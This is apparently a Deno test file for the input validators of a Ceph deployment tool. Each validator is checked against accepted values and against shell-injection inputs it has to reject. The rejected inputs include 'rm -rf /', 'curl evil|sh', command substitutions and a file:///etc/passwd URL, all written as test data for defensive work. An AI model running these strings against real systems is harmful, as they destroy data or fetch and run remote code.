import { assertEquals, assertThrows } from "jsr:@std/assert@1.0.19";
import { PhaseError } from "./errors.ts";
import {
  assertCaps,
  assertCephadmVersion,
  assertCephIdCreate,
  assertCephIdRef,
  assertContainerImage,
  assertDebPackage,
  assertFsid,
  assertHostname,
  assertHostTarget,
  assertHttpUrl,
  assertIpv4,
  assertIpv4Cidr,
  assertMdArrayPath,
  assertSerial,
  assertSshPublicKey,
  assertUnit,
  assertVgName,
  isContainerImage,
  isHostTarget,
  isHttpUrl,
  isIpv4Cidr,
  isKeyPath,
  quote,
  redactUrl,
  SSH_USER_RE,
} from "./validate.ts";

/** Injection shapes every grammar must reject. */
export const BATTERY = [
  "foo; rm -rf /",
  "foo && curl evil|sh",
  "foo`whoami`",
  "foo$(whoami)",
  "foo|sh",
  "foo\nrm -rf /",
  "foo & sleep 5",
  "foo > /etc/passwd",
  "foo < /etc/passwd",
  "foo\\bar",
];

Deno.test("V1 create-direction ceph identifiers accept and reject", () => {
  for (
    const ok of [
      "rbd_vm",
      "cephfs",
      "csi-rbd-provisioner",
      "csi-rbd-node",
      "csi-cephfs-provisioner",
      "csi-cephfs-node",
      "client.admin",
      "cephfs.cephfs.data",
      "cephfs.cephfs.meta",
      "ec_k3_m2_host",
      "host_rule",
    ]
  ) assertEquals(assertCephIdCreate("name", ok), ok);
  for (
    const bad of [
      ".mgr",
      ".rgw.root",
      "-rbd_vm",
      "_rbd_vm",
      "../../etc/passwd",
      "rbd vm",
      "",
      "foo|sh",
      "foo>out",
      "foo&",
      "a".repeat(129),
      ...BATTERY,
    ]
  ) assertThrows(() => assertCephIdCreate("name", bad), PhaseError);
});

Deno.test(
  "V2 reference-direction identifiers accept dot-prefixed reserved names", // leak-allow(decision D66)
  () => {
    for (const ok of [".mgr", ".rgw.root", "rbd_vm", "client.admin"]) {
      assertEquals(assertCephIdRef("name", ok), ok);
    }
    for (const bad of [".", "..", "../../../.mgr", ".foo; id", ...BATTERY]) {
      assertThrows(() => assertCephIdRef("name", bad), PhaseError);
    }
  },
);

Deno.test("V3 caps accept quoting shapes and reject every forbidden character", () => {
  for (
    const ok of [
      "profile rbd",
      "allow r",
      "allow rw",
      "allow rw tag cephfs metadata=*",
      "allow rw tag cephfs *=*",
      "allow rw pool=liverpool",
      "allow rw pool=liverpool namespace=namespace-name",
      "profile bootstrap-mds",
      "profile rbd-read-only",
      "allow rw path=/data",
      "allow r, allow rw pool=liverpool",
    ]
  ) assertEquals(assertCaps("caps", ok), ok);
  for (const ch of ["`", "$", ";", "&", "|", "\n", "<", ">", "(", ")", "\\"]) {
    assertThrows(() => assertCaps("caps", `allow r${ch}`), PhaseError);
  }
  for (
    const bad of [
      "allow r; id",
      "allow r $(id)",
      "allow r `id`",
      "allow r | sh",
      "",
    ]
  ) {
    assertThrows(() => assertCaps("caps", bad), PhaseError);
  }
});

Deno.test("V4 device serial accepts a narrow set and rejects everything else", () => {
  for (
    const ok of ["SN000000000A", "S0EXAMPLE00001", "PH0000000000XA", "A1-B2-C3"]
  ) {
    assertEquals(assertSerial("serial", ok), ok);
  }
  for (
    const bad of [
      "a".repeat(41),
      "a".repeat(64),
      "",
      "SN_0001",
      "SN.0001",
      "SN 0001",
      "*",
      ...BATTERY,
    ]
  ) assertThrows(() => assertSerial("serial", bad), PhaseError);
});

Deno.test("V5 hostname follows RFC 1123 labels", () => {
  for (
    const ok of [
      "node1",
      "node1.example.com",
      "a.b.c.example.com",
      "ceph-mon-1.test",
    ]
  ) {
    assertEquals(assertHostname("host", ok), ok);
  }
  for (
    const bad of [
      "-node1",
      "node1-",
      "node1..example.com",
      "node_1",
      `${"a".repeat(64)}.com`,
      "",
    ]
  ) assertThrows(() => assertHostname("host", bad), PhaseError);
});

Deno.test("V7 IPv4 refuses IPv6 with the explicit message and leading zeros", () => {
  for (
    const ok of ["203.0.113.20", "198.51.100.22", "192.0.2.0", "203.0.113.255"]
  ) {
    assertEquals(assertIpv4("addr", ok), ok);
  }
  for (
    const bad of [
      "999.999.999.999",
      "203.0.113.256",
      "0203.0.113.20",
      "203.0.113.020",
      "203.0.113",
      "",
    ]
  ) assertThrows(() => assertIpv4("addr", bad), PhaseError);
  for (
    const v6 of [
      "2001:db8::1",
      "::ffff:192.0.2.1", // leak-allow(IPv4-mapped IPv6 is the deliberate refusal case)
    ]
  ) {
    try {
      assertIpv4("addr", v6);
      throw new Error("should have thrown");
    } catch (e) {
      assertEquals(e instanceof PhaseError, true);
      assertEquals(
        (e as PhaseError).message.includes("IPv6 is not supported"),
        true,
      );
    }
  }
});

Deno.test("V6 host target disambiguates an all-numeric label as IPv4", () => {
  for (const ok of ["node1", "node1.example.com", "198.51.100.22"]) {
    assertEquals(assertHostTarget("host", ok), ok);
  }
  for (
    const bad of [
      "203.0.113.256",
      "203.0.113",
      "node1:22",
      "admin@node1",
      "-node1",
      "",
    ]
  ) {
    assertThrows(() => assertHostTarget("host", bad), PhaseError);
  }
  assertEquals(isHostTarget("192.0.2.10"), true);
  assertEquals(isHostTarget("192.0.2"), false);
});

Deno.test("V8 HTTP URL rejects smuggled content and non-http schemes", () => {
  for (
    const ok of [
      "https://download.test/ceph/cephadm",
      "https://git.example.com/ceph/raw/v19.2.3/src/cephadm/cephadm",
      "https://download.test:8443/cephadm?version=19.2.3",
    ]
  ) assertEquals(assertHttpUrl("url", ok), ok);
  for (
    const bad of [
      "http://x/f; curl evil | sh",
      "http://x/f $(id)",
      "http://x/f `id`",
      "http://x/f|sh",
      "file:///etc/passwd",
      "ftp://x/f",
      "//evil.example.com/x",
      "x.example.com/cephadm",
      "",
      "data:text/plain;base64,AAAA",
      "https://",
      "not a url at all",
      "https://x/f?a=1&b=2",
    ]
  ) assertThrows(() => assertHttpUrl("url", bad), PhaseError);
  assertEquals(isHttpUrl("https://x/f\n;id"), false);
});

Deno.test("V9 SSH public key rejects options and multi-key lines", () => {
  const key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleExampleExample";
  assertEquals(assertSshPublicKey("key", key), key);
  assertEquals(
    assertSshPublicKey(
      "key",
      `${key} ceph-3f2a9c1e-5b7d-4e8f-9a0b-1c2d3e4f5a6b`,
    ),
    `${key} ceph-3f2a9c1e-5b7d-4e8f-9a0b-1c2d3e4f5a6b`,
  );
  for (
    const bad of [
      `command="x" ${key}`,
      `from="x" ${key}`,
      `environment="x" ${key}`,
      `permitopen="x" ${key}`,
      `no-pty ${key}`,
      `${key}\n${key}`,
      "",
      "   ",
      "just a comment",
      `ssh-bogus ${key}`,
      key.replace(" ", "  "),
      `${key} two words`,
    ]
  ) assertThrows(() => assertSshPublicKey("key", bad), PhaseError);
});

Deno.test("V10 fsid accepts only an RFC 4122 textual UUID", () => {
  assertEquals(
    assertFsid("fsid", "3f2a9c1e-5b7d-4e8f-9a0b-1c2d3e4f5a6b"),
    "3f2a9c1e-5b7d-4e8f-9a0b-1c2d3e4f5a6b",
  );
  assertEquals(
    assertFsid("fsid", "3F2A9C1E-5B7D-4E8F-9A0B-1C2D3E4F5A6B"),
    "3F2A9C1E-5B7D-4E8F-9A0B-1C2D3E4F5A6B",
  );
  for (
    const bad of [
      "3f2a9c1e5b7d4e8f9a0b1c2d3e4f5a6b",
      "{3f2a9c1e-5b7d-4e8f-9a0b-1c2d3e4f5a6b}",
      "3f2a9c1e-5b7d-4e8f-9a0b-1c2d3e4f5a6bb",
      "3f2a9c1e-5b7d-4e8f-9a0b-1c2d3e4f5a6b\n",
      "*",
      "",
    ]
  ) assertThrows(() => assertFsid("fsid", bad), PhaseError);
});

Deno.test(
  "V11 connection fields follow the username and keyPath rules", // leak-allow(decision D1)
  () => {
    for (
      const ok of [
        "admin",
        "_ceph",
        "ceph-admin",
        "deploy.user",
        "a".repeat(32),
      ]
    ) {
      assertEquals(SSH_USER_RE.test(ok), true);
    }
    for (
      const bad of [
        "",
        "1admin",
        "-admin",
        ".admin",
        "ad min",
        "admin@node1",
        "admin$",
        "a".repeat(33),
      ]
    ) assertEquals(SSH_USER_RE.test(bad), false);
    for (const ok of ["/home/admin/.ssh/id_ed25519", "/run/secrets/ceph key"]) {
      assertEquals(isKeyPath(ok), true);
    }
    for (
      const bad of [
        "id_ed25519",
        "./key",
        "~/.ssh/id_ed25519",
        "/a\nb",
        "/a\tb",
      ]
    ) {
      assertEquals(isKeyPath(bad), false);
    }
  },
);

Deno.test("V13 IPv4 CIDR requires host bits zero", () => {
  for (
    const ok of [
      "198.51.100.0/24",
      "203.0.113.0/28",
      "192.0.2.0/32",
      "0.0.0.0/0",
    ]
  ) {
    assertEquals(assertIpv4Cidr("net", ok), ok);
  }
  for (
    const bad of [
      "198.51.100.0",
      "198.51.100.0/33",
      "198.51.100.0/024",
      "/24",
      "198.51.100.0/",
      "198.51.100.1/24",
      "2001:db8::/32",
    ]
  ) assertThrows(() => assertIpv4Cidr("net", bad), PhaseError);
  assertEquals(isIpv4Cidr("203.0.113.17/28"), false);
  assertEquals(isIpv4Cidr("203.0.113.0/28"), true);
});

Deno.test("V14 Debian package names reject qualifiers and pins", () => {
  for (const ok of ["podman", "chrony", "lvm2", "libstdc++6", "python3.11"]) {
    assertEquals(assertDebPackage("pkg", ok), ok);
  }
  for (
    const bad of [
      "p",
      "Podman",
      "-podman",
      ".podman",
      "podman=1.0",
      "podman:amd64",
      "podman*",
      "lvm2;reboot",
      "lvm2 podman",
      "",
      ...BATTERY,
    ]
  ) assertThrows(() => assertDebPackage("pkg", bad), PhaseError);
});

Deno.test("V15 container images require an explicit tag or digest", () => {
  for (
    const ok of [
      "registry.example.com/ceph/ceph:v19.2.3",
      "registry.example.com:5000/ceph/ceph:v19.2.3",
      `registry.example.com/ceph/ceph@sha256:${"a".repeat(64)}`,
    ]
  ) assertEquals(assertContainerImage("img", ok), ok);
  for (
    const bad of [
      "registry.example.com/ceph/ceph",
      "registry.example.com/Ceph/ceph:v19",
      "registry.example.com/ceph/ceph:",
      "registry.example.com/ceph/ceph:-v19",
      "registry.example.com//ceph:v19",
      "registry.example.com/ceph/ceph:v19 ; id",
      "registry.example.com/ceph/ceph@sha256:short",
      "",
    ]
  ) assertThrows(() => assertContainerImage("img", bad), PhaseError);
  assertEquals(isContainerImage("nginx:1.27"), true);
});

Deno.test(
  "HTTP URLs reject userinfo and non-allowlisted characters", // leak-allow(decision D24)
  () => {
    assertEquals(
      isHttpUrl("https://user:pass@download.test/cephadm"),
      false,
    );
    assertEquals(isHttpUrl("https://download.test/x?a=1&b=2"), false);
    assertEquals(isHttpUrl("https://download.test/x;id"), false);
    assertEquals(isHttpUrl("https://download.test/x`id`"), false);
    assertEquals(isHttpUrl("https://download.test/x $(id)"), false);
    assertEquals(isHttpUrl("https://download.test/x\nid"), false);
    assertEquals(
      isHttpUrl("https://download.test:8443/cephadm?version=19.2.3"),
      true,
    );
    assertEquals(redactUrl("https://user:pass@host/x"), "https://host/x");
    try {
      assertHttpUrl("url", "https://user:pass@download.test/x");
      throw new Error("should throw");
    } catch (e) {
      assertEquals((e as Error).message.includes("user:pass"), false);
    }
  },
);

Deno.test("LVM volume-group and md array grammars are allowlisted", () => {
  assertEquals(assertVgName("vg", "ceph-3f2a9c1e"), "ceph-3f2a9c1e");
  assertEquals(assertVgName("vg", "vg_0.data+1"), "vg_0.data+1");
  for (const bad of ["-vg", "vg name", "vg;id", "vg$(id)", ""]) {
    assertThrows(() => assertVgName("vg", bad), PhaseError);
  }
  assertEquals(assertMdArrayPath("array", "/dev/md0"), "/dev/md0");
  assertEquals(assertMdArrayPath("array", "/dev/md/data"), "/dev/md/data");
  for (const bad of ["/dev/sda", "/dev/md0;id", "/dev/md/../x", "md0", ""]) {
    assertThrows(() => assertMdArrayPath("array", bad), PhaseError);
  }
});

Deno.test("other owned grammars accept their documented values", () => {
  assertEquals(assertUnit("unit", "chrony.service"), "chrony.service");
  assertEquals(
    assertUnit("unit", "systemd-timesyncd.service"),
    "systemd-timesyncd.service",
  );
  assertThrows(() => assertUnit("unit", "chrony;id"), PhaseError);
  assertThrows(() => assertUnit("unit", "../x"), PhaseError);
  assertEquals(assertCephadmVersion("v", "19.2.1"), "19.2.1");
  for (const bad of ["", "19", "v19.2.1", "19.2.1;id", "squid"]) {
    assertThrows(() => assertCephadmVersion("v", bad), PhaseError);
  }
});

Deno.test(
  "POSIX single-quoting round-trips bytes through bash", // leak-allow(decision D11)
  async () => {
    const samples = [
      "hello",
      "it's",
      "a*b=c",
      "mon 'allow r'",
      "two  spaces",
      "$(id)",
    ];
    for (const s of samples) {
      const script = `printf %s ${quote(s)}`;
      const out = await new Deno.Command("bash", {
        args: ["-c", script],
        stdout: "piped",
      }).output();
      assertEquals(new TextDecoder().decode(out.stdout), s);
    }
    assertEquals(quote("hello"), "'hello'");
    assertEquals(quote("it's"), "'it'\\''s'");
    assertEquals(quote("allow rw tag cephfs *=*"), "'allow rw tag cephfs *=*'");
  },
);
